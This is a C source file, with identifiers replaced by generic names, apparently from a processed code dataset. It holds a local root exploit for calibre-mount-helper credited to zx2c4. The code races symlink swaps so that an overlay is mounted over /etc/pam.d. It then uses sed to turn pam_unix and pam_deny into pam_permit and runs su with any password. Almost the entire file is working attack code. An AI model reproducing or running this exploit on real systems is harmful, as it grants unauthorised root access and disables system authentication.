
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (int) ;
 int FUNC_1 () ;
 int FUNC_2 (int,char*,int ) ;
 int FUNC_3 () ;
 int FUNC_4 (int,int ) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int,int ,int ) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char*) ;

int FUNC_13(int VAR_2, char **VAR_3)
{
 FUNC_6("########################################################\n");
 FUNC_6("#               .80 Calibrer Assault Mount             #\n");
 FUNC_6("#                         by zx2c4                     #\n");
  FUNC_6("########################################################\n\n");


 FUNC_6("[+] Cleaning up old cruft.\n");
 FUNC_12("/dev/shm/overlay");
 FUNC_11("calibre-mount-helper cleanup /dev/ram0 /media/staging/");

 FUNC_6("[+] Creating overlay container.\n");
 FUNC_11("dd if=/dev/zero of=/dev/shm/overlay count=25600");
 FUNC_11("/usr/sbin/mkfs.ntfs /dev/shm/overlay");

 FUNC_6("[+] Mounting staging using race condition toggler...\n");
 int VAR_4 = FUNC_1();
 if (VAR_4) {
  int VAR_5;
  while ((VAR_5 = FUNC_11("calibre-mount-helper mount /dev/shm/overlay /media/staging/ 2>&1")) == 256 || VAR_5 == 8192);
  FUNC_4(VAR_4, VAR_1);
 } else {
  while (1) {
   FUNC_8("/dev/shm/overlay", "/dev/shm/overlay-holder");
   FUNC_10("/dev/ram0", "/dev/shm/overlay");
   FUNC_12("/dev/shm/overlay");
   FUNC_8("/dev/shm/overlay-holder", "/dev/shm/overlay");
  }
  return 0;
 }

 FUNC_6("[+] Preparing overlay with /etc/pam.d modification:\n");
 FUNC_11("cp -v /etc/pam.d/* /media/staging/");
 FUNC_11("sed -i \"s/pam_deny.so/pam_permit.so/g\" /media/staging/common-auth");
 FUNC_11("sed -i \"s/pam_cracklib.so.*/pam_permit.so/g\" /media/staging/system-auth");
 FUNC_11("sed -i \"s/pam_unix.so.*/pam_permit.so/g\" /media/staging/system-auth");


 FUNC_6("[+] Mounting overlay over /etc/pam.d using race condition toggler and inotify...\n");
 VAR_4 = FUNC_1();
 if (VAR_4) {
  int VAR_6 = FUNC_1();
  if (VAR_6) {
   int VAR_7;
   while ((VAR_7 = FUNC_11("calibre-mount-helper mount /dev/shm/overlay /etc/pam.d/ 2>&1")) == 256 || VAR_7 == 8192);
   FUNC_4(VAR_4, VAR_1);
   FUNC_4(VAR_6, VAR_1);
  } else {
   while (1) {
    int VAR_8;
    VAR_8 = FUNC_3();
    FUNC_12("/media/staging/fake");
    FUNC_5("/media/staging/fake");
    FUNC_2(VAR_8, "/media/staging/fake", VAR_0);
    FUNC_7(VAR_8, 0, 0);
    FUNC_8("/media/staging/fake", "/media/staging/tmp");
    FUNC_10("/etc/pam.d", "/media/staging/fake");
    FUNC_9("/media/staging/tmp");
    FUNC_0(VAR_8);
   }
  }
 } else {
  while (1) {
   FUNC_8("/dev/shm/overlay", "/dev/shm/overlay-holder");
   FUNC_10("/dev/ram0", "/dev/shm/overlay");
   FUNC_12("/dev/shm/overlay");
   FUNC_8("/dev/shm/overlay-holder", "/dev/shm/overlay");
  }
  return 0;
 }

 FUNC_6("[+] Asking for root. When prompted for a password, type anything and press enter.\n");
 FUNC_11("su");

 return 0;
}
